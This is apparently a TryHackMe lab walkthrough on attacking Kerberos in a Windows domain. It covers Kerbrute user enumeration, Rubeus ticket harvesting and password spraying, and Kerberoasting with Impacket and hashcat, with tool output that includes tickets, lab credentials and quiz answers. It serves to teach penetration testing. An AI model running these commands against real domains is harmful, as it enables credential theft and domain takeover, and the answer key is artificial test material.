# Attacking Kerberos

Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller

[Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)



---------------------------------

## Task 1 Introduction

This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.

It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.

![](https://i.imgur.com/2dq2jLY.png)

**What is Kerberos? -**

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

**Common Terminology -**

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

**AS-REQ w/ Pre-Authentication In Detail -**

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

**Ticket Granting Ticket Contents -**

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![](https://i.imgur.com/QFeXDN0.png)

**Service Ticket Contents -**

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![](https://i.imgur.com/kUqrVBa.png)

**Kerberos Authentication Overview -**

![](https://i.imgur.com/VRr2B6w.png)

- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
- AP-REP - 6.) The service grants access

**Kerberos Tickets Overview -**

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

**Attack Privilege Requirements -**

- Kerbrute Enumeration - No domain access required
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required
- Silver Ticket - Service hash required
- Skeleton Key - Full domain compromise (domain admin) required

To start this room deploy the machine and start the next section on enumeration w/ Kerbrute

This Machine can take up to 10 minutes to boot and up to 5 minutes to SSH or RDP into the machine

What does TGT stand for?

`Ticket Granting Ticket`

What does SPN stand for?

`Service Principal Name`

What does PAC stand for?

`Privilege Attribute Certificate`

What two services make up the KDC?

`AS, TGS`

Deploy the Machine

`No answer needed`

## Task 2 Enumeration w/ Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky - https://tryhackme.com/room/attacktivedirectory

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `MACHINE_IP CONTROLLER.local`

**Abusing Pre-Authentication Overview -**

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

**Kerbrute Installation -**

1. Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
2. Rename kerbrute_linux_amd64 to kerbrute
3. chmod +x kerbrute - make kerbrute executable

**Enumerating Users w/ Kerbrute -**

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1. cd into the directory that you put Kerbrute
2. Download the wordlist to enumerate with here
3. ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt - This will brute force user accounts from a domain controller using a supplied wordlist

![](https://i.imgur.com/fSDrhyb.png)

Now enumerate on your own and find the rest of the users and more importantly service accounts.

```
kali@kali:~/CTFs/tryhackme/Attacking Kerberos$ sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (1ad284a) - 11/24/20 - Ronnie Flathers @ropnop

2020/11/24 19:04:20 >  Using KDC(s):
2020/11/24 19:04:20 >   CONTROLLER.local:88

2020/11/24 19:04:20 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2020/11/24 19:04:21 >  Done! Tested 100 usernames (10 valid) in 0.406 seconds
```

How many total users do we enumerate?

`10`

What is the SQL service account name?

`sqlservice`

What is the second "machine" account name?

`machine2`

What is the third "user" account name?

`user3`

## Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus

To start this task you will need to RDP or SSH into the machine your credentials are -

Username: Administrator
Password: P@$$W0rd
Domain: controller.local

Your Machine IP is 10.10.197.112

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

Rubeus is already compiled and on the target machine.

**Harvesting Tickets w/ Rubeus -**

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

![](https://i.imgur.com/VCeyyn9.png)

```
PS C:\Users\Administrator\Downloads> . .\Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (4/24/2021 1:01:07 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  4/24/2021 12:47:57 AM
  EndTime               :  4/24/2021 10:47:57 AM
  RenewTill             :  5/1/2021 12:47:57 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkRW4Bro9ZWCH/x7poYt3i1d9i0bKHNhOfn2
    Mtj+Pc7C2SrcSUnWrUvzexoPhUzzXt+1d+AYCB9oog+PeCGabr5vxP1I6usfbrMerxMPiNGzyL8U7BCA455xYzTQkaGaH6x1k9px
    3Dd0R3bmfC8TMgz562sVH1CFqtwn7y8lT9OB+iLW4G9cBfmeEc84N5P5Ec2jmp4ZoisMeFZo/wOXyXh2lTNIOcuk6oty5qwyp9Gx
    Ly1OqolFMvdSqMmUobDhAJZYbQWFjbbzGv+HeNUTL7r6DWRynnFmYVrYafvnPQfRCFem99j4192zHkiA3xSgsduu/gisiKzfoA7L
    WTTCOBdhlmWGlk91WwFJz9cjF9fwSJZSWSHsE+zUyzSByGLGtIWjZgkZN5ZhXGcK0jIwBGYrBjeRIvqr2uwtni4Y1aYYO9CnrXqD
    Q1uKo0wORZIMTgDxa/nZiEXmVndGbFAPG5pdns5cdhWq9LfZv9f6azG4VfCvgndlLz+OAzTsbQfr7e6WNHqGtIwpdPGDYAn5idOs
    btiuUDYkAowniS7eVLCshP07TFbNNRMEYH6Wp7XGDzLH1zfy0Mt4D0jX0Ps1wlAeIpSEj/5S5W1wpvSCRQ19s+ObNCg4eHfURPnt
    DCZqBYBnoAYasPvAwA3vivGF9U/fXirCkLH8jv/pzTMc4CWXLqzb0iJubzTFgqXpv+XI4a3LeBodHia3ENVb0/nx7zlIz1JBfojO
    9RBm2Knw50qcBEDLdTcfz3QmXVpCKm/HfQYjpF3V1yfimvIYBnb7zAvP7gM2KkMaakFfMVuNmZfBRKMLYNTL0mRcHMcn3ILAK4ms
    2QhXYeutDkgyZ46dlhNEQRyw0tdNBjLOZraRxdKkKQLdEEUGWWTesf4GcLCt0OmQycRFfe5a9lUg38rJwHZ/eY51lnHxGsRLOCAt
    gCC4W2QQN/YNKtJ0CJMUhzgVel6MGADBxO5EzEXQygVlEbLTqjM8uPVyjDCcMnOHsy9JnDRAFHUJhbOoQqUfoSkQnJyBzfAJOplX
    8UsY+2cUwElZ1GyaB5u8Sw2kMSccC3UGVfjXLUwRShoCxNc666TNo/ZL/79YPtmrPN09DuAhaCOXuov9WRcBANY1XUVNgd5bbYzH
    5V+SZhJs/xC3rLFPiBRXQd8Ijl1o9zQPE6Ai1lviAhev73d2ZU0xYdvVc+b0Uw4Zf+xDCl9f8+WlChG98j+TdJoYZaZTvzGjIqCw
    bkmQ95JGUFOLeZ2z6nanTnReQc3Swu6hlvKAlVWoOQ4xt6BTiZhI1hhEfJUx9+MJ7KagUVZVG9YzS+gZ7EUJjXhabz7BE341uDSr
    5XzIIInPRDCg2rk5yhZxRORhH8icei3pmmOANo7mcF8lQSo8mgH4jtmjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCTN9CLLyxtb/RtlJW9exEuQIdbMnNyuWZO97iyKnKVzqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDQyNDA3NDc1N1qmERgPMjAyMTA0MjQxNzQ3NTdapxEYDzIwMjEwNTAx
    MDc0NzU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  4/24/2021 1:00:04 AM
  EndTime               :  4/24/2021 11:00:04 AM
  RenewTill             :  5/1/2021 1:00:04 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGnHUZbrl1LwfqtfnqgIEEquwQXwmiuax03bu
    wIstCc1Uqt96Js/Jw0cbJG0U4bsW/ON2SFc/7mzyLyL7EN8w3WobpA0EMDrerzwmT9OllbGb8UwZxGKc98AMPq0a8fXK9/GXNfEw
    qskc7+I/dy/FpwlRXd8gov7ePJk8oNFJuQ3vPJZco8lq1Wxo7cXcVbNPh1QOpGMMGbbdMFdh41+ewmaGI4a71LPvTIC09hLvgHwM
    AHPHGVMrmK7uJZSz7Njjz5OOJyMCVqvOcMXPNa4jSjApRarcJ/8YfHhjKwWv21bsp3yWYNZqZr6Of3+baAXBVeqIAeBHWeruVG4V
    C6VyPTyU3r5SPlMqa9x153T/jwG0GqI6+DeSsShGVN4PPIDZDwhFVLwWhRbMtHSXK/SxSrQv4I8vVaSCdEaVTvVTbp8of5eN0srj
    IVIofuR00I9gbcjtBaakYYWJZdG9fmfm3X3YKpwHjHlzQNi0FitKzxn2bhkQ3CUR30fXxzXt7BBgCsO2oJ9vyxJXhA4L/MB2iUci
    aVq2WQ5uGK/5B8punFFI902DTklBT//OWPpCGYvlLoa+dvLVyhA2MZD22C70DXJABcFELMh3vLbBlkXcgaEXjXye5KVoBmEZzgD6
    b5lYUCCVRH0KIPoRhl2O1fZLQS5UkpJPcQTV1zZIrCYIEccAuGoWBfw+NaUmLN3oJA/3YVaCK7v/wPeoIkkpjZv29qDGIkcNrxAL
    5VDqIizD+AAJbKbvDgj3be5L2dyVqdHTDNNTa1LwF6OQaQyuhjbBQAj7eYy2D5RrFfzX+Ot9t76CaywSnMHCa2alNgU7tzsAbRkJ
    dDRJAkeVPKCKceuMqPAdSmx7b1/lHp6o260ppbncNfqKYkggMfhPQ1zPVCIdChIT2tI9gv9lYZTk80sELV/12cKDa5ekgfGwC85o
    mxbmQKhniku1fcXl8kcybDNcIQIG8U7bMg2lH8jVHZKmyBMj+yWtP4wPnUIeJeiXLrJVzkaVh64RY1MoS2kcaT/yhr3MRPFla7/d
    q7RTOl8EO/+UmD4nJQupl78le5zsCyQBFlhDq5NRIkNbKMY1JgAADtIp6QNwB87krN5NrkEWi7U5TzYRmpKVM4lujBttukcSKsuW
    JiBlf2cjmIEiWxo0jvxL4TnEfJLosLYbr7jYxHjOeviAoLtL4Xn6d9G49nDn/9EZwiNRx9g5Xagg/P9HeCRBE/2/csSa2PLJwhZK
    qoE3LW4Y8dMWs3b/sn9sM+tH/VZzX7gUJMpIm6lq9nhEMq/mtrjxz1rTrGGANw+TK3HFdyNEX0U1wJ/pxb1MAUm/r4naJgCzdozJ
    cImZ8esz9AMpmq7UNVsVKDYQv/XxDKVYizaFH+1Cd9Te8wR7EtfOp8OYAf75DhCl3aOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIOGhlJ19Bizgv1SZlpe87egzO4F4yzi/bwj2FJsNTNTVoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwNDI0MDgwMDA0WqYRGA8yMDIxMDQyNDE4MDAwNFqnERgP
    MjAyMTA1MDEwODAwMDRaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

[*] Ticket cache size: 3
[*] Sleeping until 4/24/2021 1:01:37 AM (30 seconds) for next display
```

**Brute-Forcing / Password-Spraying w/ Rubeus -**

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:

`echo 10.10.197.112 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

![](https://i.imgur.com/WN4zVo5.png)

```
PS C:\Users\Administrator\Downloads> .\Rubeus.exe brute /password:Password1 /noticket
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7ZxBFmH1Zizei4bKnkgwRtLata0+9dNsxs+ogl8W0xt4gfWyYPePGAwN4TbAWcabDAYFrkiYNhYU
      mWM1Jv87n7oYMzJLZsT1KmVs/RRUSe69G9n5JiONUKZ6h5C6G5MjnCi/PGkqsdBxmu6rbYvJ7hLTDmvR
      0Opx+j+CKrf15LAEVJ0Ms5WkTJVDcYjuRjNVD5sYQKvPZKi6oVovG+FFtrPBXHbRQEcIKS+6WLtIte5t
      hRuyHyMbUH808R47QD1ArfUBMPL/2aVO8hLIa8PSBDH/xPtFjQ4NR/0nB2vRFo8nVvHAlJQvluj2udiW
      zCmMAsN7NpYX0HUuld+0/YVFbNK7AmXFZZsQTSGs1J4bvCPKLzOl9f86wLgTZVd64bw6jfVwo2UvMKdc
      3aFkjf25qEbOHeEh6JNPIih7Ep/r1FMQUv1Grjzikx4/1Bo95moy/2Q5tPw2xqY48Z47WNkcdxhtjlhT
      KuJ8ChNANP3u1pVlpag7qMLGpAHL/AJQQTIkNhfuYYI2tS0hmIYTMs4gL16nE8r3kEYZlan0dVyHnSJW
      FKk4fTs+wUFgiqfBZOedxQlEHKoQGnBX670ob4ujLXBFZQYYatwPhg7X/Umky2MOFFcNYNc3r4Pi1Z76
      z7e0/010wv8PxycN+ntMGZofj89ArkaNIlMmCSJeRAMvJIUpin+j80S0pZsO/9rqHlq+FBSI/Uh7xa+N
      EHteqnnZNmoGSU+u9MGoWdQ9KL0/hEaH0wkV3ghdNycbPiQ/riX8E/mpSRXxMxpGe8Q3i/fegB1mme2y
      BhCKh6p+ajtiexGF4M+rq+OcrcP5Bpa270v1RgNp+CNmI6Ch0FGR9TfmqyrSglBS0x7rpav5sJCfY424
      CxrHP19s+yFcTplZyrV8R0PZo9v5wRI2X3jyh5A8M4vJh+LXbyj87qRlA2A4SN9wdCNtWhKaVp4lUXmG
      uyE5/S/66EGTnZhaQmBs6GwWU5EIzugMNASQzNre85JMWEbSOa1+Ra8olzrRB9MY9xBF5XfI0MMbmFVv
      suUohNK7rOM3K2FcaiqFemeKff5TM2sBycg1gxnymLS7gGCjLD1+3hjxrIKxVoQ4Wx0f4uxAcginu6FG
      2tSpP5wZD83e6J0CQ5TuE48iOpmrVT4vaYmGIB2uvLop7N2jU6cKChkn5YgsKQsIjr2ptz0r8PJYqF+V
      KbeUdyFGm3aOpHmUIqsvTXjmbZpvfSlYYyzYKoKy2yj6MDT/RHW0H6iyKY3hycG8YP/rwdyV5rX69Hfg
      bRNywS4M7RRMyoVlNhe3JS4tHT6Badv6oTzayF7E6XNz16Uapmf1GYScFKQx4jGOyqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIN4YfyDfL5jwA/mtcca1E077mgxDNZGCj+hj
      i/tQETEroRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDQyNDA4MDc0MlqmERgPMjAyMTA0MjQxODA3NDJapxEYDzIwMjEwNTAxMDgwNzQyWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

Which domain admin do we get a ticket for when harvesting tickets?

`Administrator`

Which domain controller do we get a ticket for when harvesting tickets?

`CONTROLLER-1`

## Task 4 Kerberoasting w/ Rubeus & Impacket

In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

**Method 1 - Rubeus**

**Kerberoasting w/ Rubeus -**

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users

![](https://i.imgur.com/XZegVqf.png)

copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)

3. `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

Method 2 - Impacket

Impacket Installation -

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) `cd /opt` navigate to your preferred directory to save tools in

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

3.) `cd Impacket-0.9.19` navigate to the impacket directory

4.) `pip install .` - this will install all needed dependencies

Kerberoasting w/ Impacket -

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.197.112 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigation - Defending the Forest

Kerberoasting Mitigation -

     Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
     Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

What is the HTTPService Password?

What is the SQLService Password?

## Task 5 AS-REP Roasting w/ Rubeus

## Task 6 Pass the Ticket w/ mimikatz

## Task 7 Golden/Silver Ticket Attacks w/ mimikatz

## Task 8 Kerberos Backdoors w/ mimikatz

## Task 9 Conclusion
